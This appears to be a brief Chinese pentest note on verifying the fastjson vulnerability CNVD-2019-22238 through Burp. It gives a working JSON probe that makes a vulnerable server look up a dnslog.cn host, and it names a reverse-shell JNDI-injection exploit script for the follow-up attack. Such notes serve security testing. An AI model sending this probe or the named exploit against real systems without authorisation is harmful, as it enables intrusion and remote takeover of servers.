# 漏洞验证, bp 发包
fastjson-cnvd_2019_22238

```sh
# 1. 改POST
POST / HTTP/1.1
# 2. 改application/json
Content-Type: application/json

# 3. body里按下面填
{"x":{"@type":"java.net.Inet4Address","val":"2i9ehz.dnslog.cn"}}
```

使用 web_exp_reverse_shell_fastjson_jndi_JNDI-Injection-Exploit_fast.py